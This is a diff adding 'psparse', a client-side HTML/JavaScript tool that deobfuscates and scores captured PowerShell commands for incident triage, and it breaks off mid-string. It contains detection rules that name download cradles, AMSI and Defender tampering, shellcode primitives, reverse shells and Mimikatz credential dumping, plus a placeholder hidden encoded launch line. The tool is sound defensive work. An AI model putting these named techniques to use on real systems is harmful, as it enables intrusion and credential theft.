@@ -1,0 +1,815 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<!--
+  Content-Security-Policy is the primary exfiltration control.
+  default-src 'none'  -> no network of any kind (no fetch/XHR/websocket/img/font).
+  script-src/style-src 'unsafe-inline' -> only THIS file's own inline code runs;
+  nothing external can load, and there is no way to reach the network even if the
+  pasted payload contains a URL. Combined with textContent-only rendering (see the
+  el() helper below), attacker-controlled strings can neither execute nor escape.
+-->
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; base-uri 'none'; form-action 'none';">
+<title>psparse — offline PowerShell triage</title>
+<style>
+  :root{
+    --bg:#12161c; --panel:#171c24; --panel2:#1d232c; --line:#2a323d;
+    --fg:#dfe6ee; --muted:#8a97a6; --faint:#5f6b78;
+    --accent:#e2b341;            /* tool chrome / headings */
+    --crit:#ff5c6c; --high:#ff9d4d; --med:#ffd24d; --low:#7fb2ff; --ok:#57c98a;
+    --mono:ui-monospace,"SF Mono",Menlo,Consolas,"Liberation Mono",monospace;
+    --sans:system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--fg);font-family:var(--sans);
+       font-size:15px;line-height:1.5;-webkit-text-size-adjust:100%}
+  .wrap{max-width:980px;margin:0 auto;padding:28px 20px 80px}
+  header{display:flex;align-items:baseline;gap:14px;flex-wrap:wrap;
+         border-bottom:1px solid var(--line);padding-bottom:14px;margin-bottom:22px}
+  h1{font-size:22px;margin:0;letter-spacing:.2px}
+  h1 .t{color:var(--accent);font-family:var(--mono);font-weight:600}
+  .tag{color:var(--faint);font-size:12.5px}
+  .offline{margin-left:auto;color:var(--ok);font-size:12.5px;font-family:var(--mono)}
+  label.fld{display:block;font-size:12.5px;color:var(--muted);margin:0 0 6px}
+  textarea{width:100%;min-height:140px;resize:vertical;background:var(--panel);
+           color:var(--fg);border:1px solid var(--line);border-radius:8px;
+           padding:12px 13px;font-family:var(--mono);font-size:13.5px;line-height:1.55}
+  textarea:focus{outline:2px solid var(--accent);outline-offset:1px;border-color:transparent}
+  .controls{display:flex;gap:12px;align-items:center;margin:12px 0 4px;flex-wrap:wrap}
+  button{background:var(--accent);color:#141414;border:0;border-radius:7px;
+          padding:9px 18px;font-size:14px;font-weight:600;cursor:pointer;font-family:var(--sans)}
+  button.ghost{background:transparent;color:var(--fg);border:1px solid var(--line)}
+  button:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+  .opt{display:flex;align-items:center;gap:6px;color:var(--muted);font-size:13px}
+  .hint{color:var(--faint);font-size:12px;margin-left:auto}
+  #out{margin-top:26px;display:none}
+  .verdict{border-radius:10px;padding:14px 16px;font-family:var(--mono);
+           font-size:15px;border:1px solid var(--line);background:var(--panel)}
+  .verdict b{font-size:16px}
+  .score{float:right;color:var(--muted);font-size:13px}
+  section.blk{margin-top:22px}
+  section.blk > h2{font-size:12.5px;text-transform:none;color:var(--muted);
+       font-weight:600;margin:0 0 10px;letter-spacing:.3px}
+  pre.code{background:var(--panel);border:1px solid var(--line);border-radius:8px;
+       padding:12px 13px;overflow-x:auto;font-family:var(--mono);font-size:13px;
+       white-space:pre-wrap;word-break:break-all;margin:0;color:var(--fg)}
+  .note{color:var(--faint);font-size:12.5px;font-family:var(--mono);margin:2px 0}
+  .finding{border:1px solid var(--line);border-left-width:3px;border-radius:7px;
+       background:var(--panel);padding:10px 12px;margin-bottom:9px}
+  .finding .top{display:flex;gap:10px;align-items:baseline;flex-wrap:wrap}
+  .sev{font-family:var(--mono);font-size:11px;font-weight:700;padding:2px 7px;
+       border-radius:4px;color:#141414}
+  .finding .nm{font-weight:600}
+  .finding .meta{color:var(--muted);font-size:12px;font-family:var(--mono);margin-left:auto}
+  .finding .desc{color:var(--muted);font-size:13px;margin-top:5px}
+  .finding .matched{color:var(--faint);font-size:12px;font-family:var(--mono);margin-top:4px;
+       word-break:break-all}
+  .sev-critical{border-left-color:var(--crit)} .bg-critical{background:var(--crit)}
+  .sev-high{border-left-color:var(--high)} .bg-high{background:var(--high)}
+  .sev-medium{border-left-color:var(--med)} .bg-medium{background:var(--med)}
+  .sev-low{border-left-color:var(--low)} .bg-low{background:var(--low)}
+  table.ioc{width:100%;border-collapse:collapse;font-family:var(--mono);font-size:13px}
+  table.ioc td{border-top:1px solid var(--line);padding:6px 8px;vertical-align:top}
+  table.ioc td.k{color:var(--muted);width:120px;white-space:nowrap}
+  table.ioc td.v{word-break:break-all}
+  .att{display:inline-block;font-family:var(--mono);font-size:12px;color:var(--fg);
+       background:var(--panel2);border:1px solid var(--line);border-radius:4px;
+       padding:2px 7px;margin:0 6px 6px 0}
+  .empty{color:var(--faint);font-family:var(--mono);font-size:13px}
+  footer{margin-top:34px;border-top:1px solid var(--line);padding-top:14px;
+       color:var(--faint);font-size:12px;line-height:1.6}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <header>
+    <h1><span class="t">psparse</span></h1>
+    <span class="tag">offline PowerShell command triage · static / heuristic only · never executes input</span>
+    <span class="offline" id="offlineflag">● local</span>
+  </header>
+
+  <label class="fld" for="cmd">Paste a captured PowerShell command (EID 4688 / 4104, Sysmon 1, .lnk, autorun…)</label>
+  <textarea id="cmd" spellcheck="false" autocomplete="off"
+    placeholder="e.g.  powershell -nop -w hidden -enc SQBFAFgAIAA..."></textarea>
+
+  <div class="controls">
+    <button id="run">Analyze</button>
+    <button id="clear" class="ghost">Clear</button>
+    <button id="copy" class="ghost" style="display:none">Copy report (Markdown)</button>
+    <label class="opt"><input type="checkbox" id="defang" checked> defang IOCs</label>
+    <select id="sample" class="opt" title="Load an inert demo sample">
+      <option value="">Load sample…</option>
+    </select>
+    <input id="label" class="opt" type="text" spellcheck="false" autocomplete="off"
+           placeholder="source label (host / EID) — for the report" style="min-width:220px">
+    <span class="hint" id="len"></span>
+  </div>
+
+  <div id="out"></div>
+
+  <footer id="foot"></footer>
+</div>
+
+<script>
+"use strict";
+/* =========================================================================
+   psparse.html — 100% client-side. No network, no storage, no execution.
+   Security model:
+     - CSP default-src 'none' (see <head>) => zero network / exfiltration.
+     - el() builds DOM with textContent only. Untrusted strings are NEVER
+       assigned to innerHTML anywhere, so a payload containing markup like
+       <img onerror=...> is rendered as inert text, not parsed as HTML.
+     - No localStorage/sessionStorage => pasted evidence does not persist.
+   Logic is a faithful port of the psparse.py triage engine.
+   ========================================================================= */
+
+const MAX_INPUT = 200000;   // guard against pathological-regex hangs
+const MAX_DEPTH = 12;
+const MIN_B64   = 16;
+
+const SEV_WEIGHT = {info:0, low:1, medium:3, high:6, critical:10};
+
+/* ---- detection ruleset (data-driven; extend per campaign) ------------- */
+const RULES = [
+ {id:"ENC-B64CMD",name:"Encoded command (-EncodedCommand)",cat:"obfuscation",sev:"high",
+  mitre:["T1027.010","T1059.001"],pat:[/-e[a-z]*\s+[A-Za-z0-9+/=]{16,}/i],
+  desc:"Base64/UTF-16LE encoded script block passed to powershell.exe. Classic evasion of command-line inspection."},
+ {id:"ENC-FROMB64",name:"FromBase64String decode",cat:"obfuscation",sev:"medium",mitre:["T1027"],
+  pat:[/frombase64string/i],
+  desc:"In-script base64 decode, typically feeding a byte array to decompression, GetString, or reflective load."},
+ {id:"ENC-COMPRESS",name:"In-memory (de)compression",cat:"obfuscation",sev:"medium",mitre:["T1027"],
+  pat:[/(gzip|deflate)stream/i],
+  desc:"Gzip/Deflate stream used to pack a payload so it never appears as plaintext on the command line."},
+ {id:"ENC-CHARJOIN",name:"Char-code / -join reconstruction",cat:"obfuscation",sev:"low",mitre:["T1027"],
+  pat:[/\[char\](\[\])?/i,/-join\s*['"(]/i],
+  desc:"String rebuilt from integer/char arrays to defeat signature and keyword matching."},
+ {id:"ENC-FORMAT",name:"Format-operator obfuscation",cat:"obfuscation",sev:"low",mitre:["T1027"],
+  pat:[/'(?:[^']*\{\d+\}[^']*)+'\s*-f\s/i],
+  desc:"-f format operator reorders string fragments to hide keywords like IEX / DownloadString."},
+ {id:"ENC-BACKTICK",name:"Backtick token-splitting",cat:"obfuscation",sev:"low",mitre:["T1027"],
+  pat:[/\w`\w/],
+  desc:"Backtick inserted inside identifiers (e.g. i`e`x) to break naive keyword detection."},
+
+ {id:"EXE-IEX",name:"Invoke-Expression (IEX)",cat:"execution",sev:"high",mitre:["T1059.001"],
+  pat:[/\b(iex|invoke-expression)\b/i,/\.invoke\(\)/i],
+  desc:"Dynamic execution of a constructed string. Almost always the payload-detonation step in a cradle."},
+ {id:"EXE-BYPASS",name:"ExecutionPolicy Bypass",cat:"defense-evasion",sev:"medium",mitre:["T1059.001","T1562.001"],
+  pat:[/-e(?:p|x|xec|xecutionpolicy)?\s+bypass/i,/-executionpolicy\s+unrestricted/i],
+  desc:"Disables execution policy for this process. Common in operator one-liners and initial-access lures."},
+ {id:"EXE-DYNMOD",name:"Dynamic ScriptBlock / in-memory module",cat:"execution",sev:"high",mitre:["T1059.001"],
+  pat:[/scriptblock\]::create/i,/new-module\b/i,/\.getnewclosure/i,/invoke-command\s+-scriptblock/i],
+  desc:"Executes a string as code via [ScriptBlock]::Create / New-Module instead of IEX - a common way to dodge Invoke-Expression keyword detection. When the string comes from a remote fetch, this is a fileless download cradle."},
+ {id:"EXE-NOPROFILE",name:"Non-interactive launch flags",cat:"defense-evasion",sev:"low",mitre:["T1059.001"],
+  pat:[/-nop(rofile)?\b/i,/-noni(nteractive)?\b/i,/-w(indowstyle)?\s+hidden/i],
+  desc:"Hidden-window / no-profile / non-interactive flags. Typical of automated or staged execution."},
+
+ {id:"C2-WEBCLIENT",name:"Net.WebClient download cradle",cat:"command-and-control",sev:"high",mitre:["T1105","T1059.001"],
+  pat:[/net\.webclient/i,/downloadstring/i,/downloadfile/i,/downloaddata/i],
+  desc:"Downloads a stage/payload from a remote host. DownloadString+IEX is the canonical PowerShell cradle."},
+ {id:"C2-IWR",name:"Invoke-WebRequest / Invoke-RestMethod",cat:"command-and-control",sev:"medium",mitre:["T1105"],
+  pat:[/\b(invoke-webrequest|iwr|invoke-restmethod|irm|wget|curl)\b/i],
+  desc:"HTTP(S) fetch of remote content. Benign in admin scripts; suspicious when paired with IEX or an IP literal."},
+ {id:"C2-BITS",name:"BITS transfer",cat:"command-and-control",sev:"medium",mitre:["T1105","T1197"],
+  pat:[/start-bitstransfer/i,/bitsadmin/i],
+  desc:"Background Intelligent Transfer Service used to pull a payload while surviving reboots."},
+
+ {id:"DEF-AMSI",name:"AMSI bypass",cat:"defense-evasion",sev:"critical",mitre:["T1562.001"],
+  pat:[/amsiutils/i,/amsiinitfailed/i,/amsicontext/i,/amsiscanbuffer/i,/amsi\.dll/i,/system\.management\.automation\.amsi/i],
+  desc:"Tampering with the Antimalware Scan Interface so subsequent script content is not scanned."},
+ {id:"DEF-ETW",name:"ETW / logging tamper",cat:"defense-evasion",sev:"high",mitre:["T1562.002","T1562.006"],
+  pat:[/etweventwrite/i,/psetwlogprovider/i,/scriptblocklogging/i],
+  desc:"Attempts to blind Event Tracing for Windows or PowerShell script-block logging."},
+ {id:"DEF-DEFENDER",name:"Defender tamper",cat:"defense-evasion",sev:"high",mitre:["T1562.001"],
+  pat:[/set-mppreference/i,/add-mppreference.{0,40}exclusion/i,/disablerealtimemonitoring/i,/disableioavprotection/i],
+  desc:"Disables Defender real-time protection or adds an exclusion path to stage tooling."},
+
+ {id:"INJ-REFLECT",name:"Reflective assembly load",cat:"execution",sev:"high",mitre:["T1620"],
+  pat:[/reflection\.assembly.{0,20}load/i],
+  desc:"Loads a .NET assembly from memory with no file on disk. Common for post-ex frameworks."},
+ {id:"INJ-SHELLCODE",name:"Shellcode / API primitives",cat:"execution",sev:"critical",mitre:["T1055"],
+  pat:[/virtualalloc/i,/createthread/i,/writeprocessmemory/i,/runtime\.interopservices\.marshal/i,
+       /getdelegatefortype/i,/\bntdll\b/i,/\bkernel32\b/i],
+  desc:"Win32/native primitives for allocating executable memory and running shellcode in-process or remotely."},
+ {id:"EXE-ADDTYPE",name:"Add-Type / runtime C# compilation",cat:"execution",sev:"medium",mitre:["T1059.001"],
+  pat:[/add-type/i,/dllimport/i,/reflection\.emit/i],
+  desc:"Compiles or loads C#/.NET at runtime (Add-Type / DllImport). Frequently used to reach Win32 APIs (VirtualAlloc, CreateThread) for shellcode."},
+ {id:"REV-SHELL",name:"Reverse shell / raw TCP client",cat:"command-and-control",sev:"high",mitre:["T1095","T1059.001"],
+  pat:[/net\.sockets\.tcpclient/i,/\btcpclient\b/i,/tcplistener/i,/getstream\s*\(/i,/redirectstandardinput/i],
+  desc:"Creates a raw TCP client/socket, typically a PowerShell reverse shell for interactive C2."},
+ {id:"PATH-STAGING",name:"Reference to a staging directory",cat:"defense-evasion",sev:"medium",mitre:["T1059.001"],
+  pat:[/\\users\\public\\/i,/\\appdata\\(local|roaming)\\/i,/\\programdata\\/i,/\\windows\\temp\\/i,/\$env:temp/i,/\\temp\\[^\\\s'"]+\.(ps1|exe|dll|bat|vbs|hta|scr)/i],
+  desc:"References a common malware staging directory (Public, Temp, AppData, ProgramData). Legitimate software occasionally uses these, so correlate with the file written/run."},
+
+ {id:"CRED-MIMI",name:"Mimikatz / LSASS",cat:"credential-access",sev:"critical",mitre:["T1003.001"],
+  pat:[/mimikatz/i,/invoke-mimikatz/i,/sekurlsa/i,/logonpasswords/i,/\blsass\b/i],
+  desc:"Credential dumping via Mimikatz or direct LSASS access."},
+ {id:"CRED-PROMPT",name:"Credential prompt / capture",cat:"credential-access",sev:"medium",mitre:["T1056.002"],
+  pat:[/get-credential/i,/promptforcredential/i,/\[system\.net\.networkcredential\]/i],
+  desc:"Prompts for or constructs credentials; in phishing scripts this is often credential harvesting."},
+
+ {id:"PER-SCHTASK",name:"Scheduled task persistence",cat:"persistence",sev:"high",mitre:["T1053.005"],
+  pat:[/register-scheduledtask/i,/new-scheduledtask/i,/schtasks(\.exe)?\s+\/create/i],
+  desc:"Creates a scheduled task to survive reboots / re-run a payload."},
+ {id:"PER-RUNKEY",name:"Run-key persistence",cat:"persistence",sev:"high",mitre:["T1547.001"],
+  pat:[/currentversion\\run/i,/new-itemproperty.{0,40}hk(cu|lm)/i,/set-itemproperty.{0,40}\\run/i],
+  desc:"Writes an autostart entry under a Run/RunOnce registry key."},
+ {id:"PER-WMI",name:"WMI event-subscription persistence",cat:"persistence",sev:"high",mitre:["T1546.003"],
+  pat:[/__eventfilter/i,/commandlineeventconsumer/i,/__filtertoconsumerbinding/i],
+  desc:"Permanent WMI event subscription — a stealthy, fileless persistence mechanism."},
+
+ {id:"LAT-WINRM",name:"Remote execution (WinRM/Invoke-Command)",cat:"lateral-movement",sev:"medium",mitre:["T1021.006"],
+  pat:[/invoke-command\s+-computername/i,/enter-pssession/i,/new-pssession/i],
+  desc:"Executes against a remote host over WinRM. Benign for admins; correlate with the source account."},
+ {id:"LAT-ADMINSHARE",name:"Admin-share access",cat:"lateral-movement",sev:"medium",mitre:["T1021.002"],
+  pat:[/\\\\[^\\]+\\(admin\$|c\$|ipc\$)/i],
+  desc:"Access to ADMIN$/C$ shares, a common lateral-movement / tool-staging vector."},
+
+ {id:"DISC-NET",name:"Account / group manipulation",cat:"impact",sev:"high",mitre:["T1136.001","T1098"],
+  pat:[/net\s+user\s+.+\/add/i,/net\s+localgroup\s+administrators.+\/add/i,/new-localuser/i],
+  desc:"Creates a local account or adds one to Administrators — privilege/persistence."},
+
+ {id:"TOOL-POSTEX",name:"Known post-exploitation tooling",cat:"tooling",sev:"high",mitre:["T1059.001"],
+  pat:[/invoke-shellcode/i,/invoke-dllinjection/i,/invoke-reflectivepeinjection/i,/powersploit/i,
+       /invoke-empire/i,/powerview/i,/invoke-bloodhound/i,/nishang/i,/invoke-obfuscation/i,/cobaltstrike|beacon/i],
+  desc:"Function/tool names from PowerSploit/Empire/Nishang/Cobalt Strike and similar frameworks."},
+];
+
+/* ---- IOC patterns ----------------------------------------------------- */
+const IOC = {
+  url:      /https?:\/\/[^\s'"\)\}<>|`]+/ig,
+  ipv4:     /\b(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)\b/g,
+  ip_port:  /\b(?:\d{1,3}\.){3}\d{1,3}:\d{1,5}\b/g,
+  domain:   /\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,24}\b/ig,
+  unc_path: /\\\\[^\\\s'"|`]+\\[^\s'"|`]+/g,
+  win_path: /[a-z]:\\[^\s'"|`<>]+/ig,
+  reg_key:  /HK(?:LM|CU|CR|U|CC)\\[^\s'"|`]+/ig,
+};
+const DOMAIN_STOP = /\.(exe|dll|ps1|psm1|ps1xml|bat|cmd|txt|log|dat|tmp|sys|ini|xml|json|cs|vbs|msi|msu|zip|7z|rar|gz|scr|hta|jar|lnk)$|^(system|net|io|text|reflection|management|automation|runtime|interopservices|convert|math|console|environment)\./i;
+
+/* ---- ATT&CK reference ------------------------------------------------- */
+const ATTACK={
+ "T1059.001":["PowerShell","Execution"],
+ "T1027":["Obfuscated Files or Information","Defense Evasion"],
+ "T1027.010":["Command Obfuscation","Defense Evasion"],
+ "T1140":["Deobfuscate/Decode Files or Information","Defense Evasion"],
+ "T1105":["Ingress Tool Transfer","Command and Control"],
+ "T1095":["Non-Application Layer Protocol","Command and Control"],
+ "T1197":["BITS Jobs","Defense Evasion / Persistence"],
+ "T1562.001":["Impair Defenses: Disable or Modify Tools","Defense Evasion"],
+ "T1562.002":["Impair Defenses: Disable Windows Event Logging","Defense Evasion"],
+ "T1562.006":["Impair Defenses: Indicator Blocking","Defense Evasion"],
+ "T1620":["Reflective Code Loading","Defense Evasion"],
+ "T1055":["Process Injection","Defense Evasion / Privilege Escalation"],
+ "T1003.001":["OS Credential Dumping: LSASS Memory","Credential Access"],
+ "T1056.002":["Input Capture: GUI Input Capture","Credential Access / Collection"],
+ "T1053.005":["Scheduled Task","Execution / Persistence / Privilege Escalation"],
+ "T1547.001":["Registry Run Keys / Startup Folder","Persistence / Privilege Escalation"],
+ "T1546.003":["WMI Event Subscription","Persistence / Privilege Escalation"],
+ "T1021.006":["Remote Services: Windows Remote Management","Lateral Movement"],
+ "T1021.002":["Remote Services: SMB/Windows Admin Shares","Lateral Movement"],
+ "T1136.001":["Create Account: Local Account","Persistence"],
+ "T1098":["Account Manipulation","Persistence / Privilege Escalation"]
+};
+
+/* ---- deobfuscation (records an ordered step per transform) ------------ */
+function excerpt(s,n){ n=n||90; s=String(s).replace(/[\r\n]+/g," "); return s.length<=n?s:s.slice(0,n)+" ..."; }
+function mkstep(ctx,layer,tech,mitre,detail,before,after){
+  ctx.n++; ctx.steps.push({n:ctx.n,layer,tech,mitre,detail,before,after});
+}
+function asciiRatio(t){
+  if(!t) return 0; let g=0;
+  for(const c of t){ const o=c.charCodeAt(0); if((o>=32&&o<=126)||o===9||o===10||o===13) g++; }
+  return g/t.length;
+}
+const DECODE_EVIDENCE=["http","://","iex","invoke","new-object","downloadstring","frombase64",
+  ".ps1","system.","reflection","-join","[char]","scriptblock","powershell","webclient","$(",
+  "::","start-","set-item","gzip","deflate","-enc","bypass"];
+function looksLikeScript(t){
+  // Score a candidate DECODING: must be mostly printable ASCII AND carry a script/URL token.
+  // Rejects plaintext (e.g. a domain label grabbed as base64 and mangled into CJK).
+  if(!t) return 0;
+  if(asciiRatio(t)<0.85) return 0;
+  const s=t.trim();
+  if(s.length>=24 && /^[A-Za-z0-9+/=\s]+$/.test(s)) return 0.5;  // nested base64, worth peeling
+  const low=t.toLowerCase();
+  let hits=0; for(const k of DECODE_EVIDENCE){ let i=0; while((i=low.indexOf(k,i))!==-1){hits++;i+=k.length;} }
+  if(hits===0) return 0;
+  return Math.min(1, 0.4 + hits/6);
+}
+function b64ToBytes(b64){
+  const clean=b64.replace(/[^A-Za-z0-9+/]/g,"");
+  const padded=clean+"=".repeat((4-clean.length%4)%4);
+  const bin=atob(padded);
+  const out=new Uint8Array(bin.length);
+  for(let i=0;i<bin.length;i++) out[i]=bin.charCodeAt(i);
+  return out;
+}
+async function inflate(bytes,fmt){
+  const ds=new DecompressionStream(fmt);
+  const stream=new Blob([bytes]).stream().pipeThrough(ds);
+  const buf=await new Response(stream).arrayBuffer();
+  return new Uint8Array(buf);
+}
+async function tryB64(blob){
+  let bytes; try{ bytes=b64ToBytes(blob); }catch(e){ return []; }
+  if(!bytes.length) return [];
+  const out=[];
+  try{ out.push({tag:"UTF-16LE",tech:"Base64 decode (UTF-16LE)",text:new TextDecoder("utf-16le").decode(bytes)}); }catch(e){}
+  try{ out.push({tag:"UTF-8",tech:"Base64 decode (UTF-8)",text:new TextDecoder("utf-8",{fatal:false}).decode(bytes)}); }catch(e){}
+  if(bytes[0]===0x1f && bytes[1]===0x8b){
+    try{ out.push({tag:"gzip",tech:"Gzip decompression",text:new TextDecoder().decode(await inflate(bytes,"gzip"))}); }catch(e){}
+  }
+  try{ out.push({tag:"deflate",tech:"Deflate decompression",text:new TextDecoder().decode(await inflate(bytes,"deflate-raw"))}); }catch(e){}
+  return out;
+}
+function pBacktick(text,layer,ctx){
+  const clusters=text.match(/\w(?:`\w)+/g);
+  const nw=text.replace(/(\w)`(?=\w)/g,"$1");
+  if(nw!==text){
+    const s=clusters?clusters[0]:"`";
+    const removed=(text.split("`").length-1)-(nw.split("`").length-1);
+    mkstep(ctx,layer,"Backtick token-splitting","T1027.010",
+      "removed "+removed+" identifier backtick(s)",
+      excerpt(s), excerpt(s.replace(/(\w)`(?=\w)/g,"$1")));
+  }
+  return nw;
+}
+function pReverse(text,layer,ctx){
+  const re=/(['"])((?:(?!\1).){2,})\1\s*\[\s*-1\s*\.\.\s*-?\d+\s*\]\s*-join\s*(['"])\3/g;
+  return text.replace(re,(full,q,lit)=>{
+    const r=lit.split("").reverse().join("");
+    mkstep(ctx,layer,"String reversal","T1027.010","reversed a literal",excerpt(full),excerpt("'"+r+"'"));
+    return "'"+r+"'";
+  });
+}
+function pFormat(text,layer,ctx){
+  const re=/(['"])((?:\{\d+\}|(?!\1).)*)\1\s*-f\s*((?:\s*(['"])(?:(?!\4).)*\4\s*,?)+)/g;
+  return text.replace(re,(full,q,fmt,argstr)=>{
+    const args=[...argstr.matchAll(/(['"])((?:(?!\1).)*)\1/g)].map(a=>a[2]);
+    let ok=true;
+    const r=fmt.replace(/\{(\d+)\}/g,(g,n)=>{ if(args[+n]===undefined){ok=false;return g;} return args[+n]; });
+    if(!ok) return full;
+    mkstep(ctx,layer,"Format-operator (-f) reconstruction","T1027.010",
+      "reordered string fragments",excerpt(full),excerpt("'"+r+"'"));
+    return "'"+r+"'";
+  });
+}
+function pCharJoin(text,layer,ctx){
+  text=text.replace(/\(([\d\s,]+)\)\s*-join\s*(['"])\2/g,(full,nums)=>{
+    const cps=nums.match(/\d+/g); if(!cps) return full;
+    const s=cps.map(n=>String.fromCharCode(+n)).join("");
+    mkstep(ctx,layer,"Char-code array reconstruction","T1027.010",cps.length+" code points",excerpt(full),excerpt("'"+s+"'"));
+    return "'"+s+"'";
+  });
+  text=text.replace(/(?:\[char\]\s*\d+\s*\+?\s*){2,}/ig,(full)=>{
+    const cps=full.match(/\d+/g); if(!cps) return full;
+    const s=cps.map(n=>String.fromCharCode(+n)).join("");
+    mkstep(ctx,layer,"[char] sequence reconstruction","T1027.010","concatenated [char] casts",excerpt(full),excerpt(s));
+    return s;
+  });
+  return text;
+}
+async function pBase64(text,layer,ctx){
+  const re=new RegExp("[A-Za-z0-9+/]{"+MIN_B64+",}={0,2}","g");
+  let result=text;
+  for(const m of text.matchAll(re)){
+    const blob=m[0];
+    const pre=text.slice(Math.max(0,m.index-28),m.index).toLowerCase();
+    // argument to an encoded-command switch / FromBase64String / ::Create => base64 by contract
+    const trusted=/-e[a-z]*\s*$/.test(pre)||pre.includes("frombase64string")||pre.includes("::create");
+    const cands=await tryB64(blob);
+    let best=null,bestKey=[-1,-1];
+    for(const c of cands){
+      const ev=looksLikeScript(c.text), ar=asciiRatio(c.text);
+      const ok = ev>=0.4 || (trusted && ar>=0.90);
+      if(ok && (ev>bestKey[0] || (ev===bestKey[0] && ar>bestKey[1]))){ best=c; bestKey=[ev,ar]; }
+    }
+    if(best){
+      mkstep(ctx,layer,best.tech,"T1027.010",
+        blob.length+" chars \u2192 "+best.text.length+" chars",excerpt(blob,50),excerpt(best.text));
+      result=result.split(blob).join(`\n/*[decoded:${best.tag}]*/\n${best.text}\n`);
+    }
+  }
+  return result;
+}
+async function deobfuscate(cmd){
+  const ctx={n:0,steps:[]}; let cur=cmd;
+  for(let layer=1;layer<=MAX_DEPTH;layer++){
+    let nx=cur;
+    nx=pBacktick(nx,layer,ctx); nx=pReverse(nx,layer,ctx); nx=pFormat(nx,layer,ctx);
+    nx=pCharJoin(nx,layer,ctx); nx=await pBase64(nx,layer,ctx);
+    if(nx===cur) break;
+    cur=nx;
+  }
+  const layers=ctx.steps.reduce((m,s)=>Math.max(m,s.layer),0);
+  return {final:cur, steps:ctx.steps, layers};
+}
+
+/* ---- detection / iocs / scoring -------------------------------------- */
+function matchRules(hay){
+  const found=[];
+  for(const r of RULES){
+    const hits=[];
+    for(const p of r.pat){
+      const g=new RegExp(p.source, p.flags.includes("g")?p.flags:p.flags+"g");
+      let m; while((m=g.exec(hay))!==null){ const f=m[0].trim().slice(0,120);
+        if(f&&!hits.includes(f)) hits.push(f); if(g.lastIndex===m.index) g.lastIndex++; }
+    }
+    if(hits.length) found.push({...r, matched:hits.slice(0,5)});
+  }
+  return found;
+}
+function extractIOCs(text){
+  const out={};
+  for(const [name,re] of Object.entries(IOC)){
+    const set=new Set(); let m; re.lastIndex=0;
+    while((m=re.exec(text))!==null){ set.add(m[0]); if(re.lastIndex===m.index) re.lastIndex++; }
+    let vals=[...set];
+    if(name==="domain") vals=vals.filter(v=>!DOMAIN_STOP.test(v));
+    if(vals.length) out[name]=vals.sort();
+  }
+  return out;
+}
+function verdict(s){
+  if(s>=15) return ["MALICIOUS (high confidence)","critical"];
+  if(s>=8)  return ["SUSPICIOUS (likely malicious / operator activity)","high"];
+  if(s>=3)  return ["SUSPICIOUS (review in context)","medium"];
+  if(s>0)   return ["LOW / benign-leaning (review)","low"];
+  return ["BENIGN (no known-bad indicators)","ok"];
+}
+async function sha256hex(str){
+  const buf=await crypto.subtle.digest("SHA-256", new TextEncoder().encode(str));
+  return [...new Uint8Array(buf)].map(b=>b.toString(16).padStart(2,"0")).join("");
+}
+const EX_VERBS={"get": "retrieves", "set": "modifies", "new": "creates", "remove": "deletes", "add": "adds to", "start": "launches", "stop": "stops", "restart": "restarts", "invoke": "executes", "out": "sends output to", "import": "loads", "export": "writes out", "convertto": "converts to", "convertfrom": "converts from", "register": "registers (often persistence)", "unregister": "removes", "enable": "enables", "disable": "disables", "clear": "clears", "copy": "copies", "move": "moves", "rename": "renames", "test": "checks", "select": "selects", "where": "filters", "sort": "sorts", "measure": "measures", "group": "groups", "format": "formats", "write": "writes", "read": "reads", "update": "updates", "install": "installs", "uninstall": "uninstalls", "save": "saves", "receive": "receives", "send": "sends", "connect": "connects", "disconnect": "disconnects", "enter": "enters (remoting/session)", "exit": "exits", "find": "finds", "search": "searches", "wait": "waits", "resolve": "resolves", "expand": "expands", "compress": "compresses", "protect": "encrypts", "unprotect": "decrypts", "suspend": "suspends", "resume": "resumes", "mount": "mounts", "split": "splits", "join": "joins", "push": "pushes", "pop": "pops"};
+const EX_CMDLETS={"iex": ["executes a string as PowerShell code (dynamic execution)", "suspicious"], "invoke-expression": ["executes a string as PowerShell code (dynamic execution)", "suspicious"], "irm": ["Invoke-RestMethod: fetches remote content over HTTP(S)", "notable"], "invoke-restmethod": ["fetches remote content over HTTP(S)", "notable"], "iwr": ["Invoke-WebRequest: fetches remote content over HTTP(S)", "notable"], "invoke-webrequest": ["fetches remote content over HTTP(S)", "notable"], "wget": ["alias for Invoke-WebRequest: fetches remote content", "notable"], "curl": ["alias for Invoke-WebRequest: fetches remote content", "notable"], "new-object": ["instantiates a .NET or COM object", "notable"], "add-type": ["compiles/loads .NET code at runtime", "suspicious"], "new-module": ["creates a dynamic in-memory module (can run a scriptblock without IEX)", "suspicious"], "invoke-command": ["runs a scriptblock, possibly on a remote host (WinRM)", "notable"], "icm": ["Invoke-Command: runs a scriptblock, possibly remote (WinRM)", "notable"], "enter-pssession": ["opens an interactive remote session (WinRM)", "notable"], "new-pssession": ["creates a remote session (WinRM)", "notable"], "start-process": ["launches a new process", "notable"], "saps": ["Start-Process: launches a new process", "notable"], "start-bitstransfer": ["downloads a file via BITS", "notable"], "import-module": ["loads a PowerShell module", "info"], "set-mppreference": ["changes Microsoft Defender settings (often disabling protection)", "suspicious"], "add-mppreference": ["adds a Defender setting (often an exclusion path)", "suspicious"], "set-executionpolicy": ["changes the script execution policy", "notable"], "register-scheduledtask": ["creates a scheduled task (persistence)", "suspicious"], "new-scheduledtask": ["defines a scheduled task (persistence)", "suspicious"], "schtasks": ["creates/edits a scheduled task (persistence)", "suspicious"], "new-itemproperty": ["writes a registry value (Run-key => persistence)", "notable"], "set-itemproperty": ["writes a registry/item value (Run-key => persistence)", "notable"], "new-item": ["creates a file/registry item", "info"], "set-wmiinstance": ["creates a WMI instance (event-subscription persistence)", "suspicious"], "register-wmievent": ["registers a WMI event (persistence)", "suspicious"], "register-cimindicationevent": ["registers a CIM/WMI event (persistence)", "suspicious"], "new-service": ["creates a Windows service (persistence)", "suspicious"], "get-credential": ["prompts for credentials", "notable"], "invoke-mimikatz": ["runs Mimikatz (credential 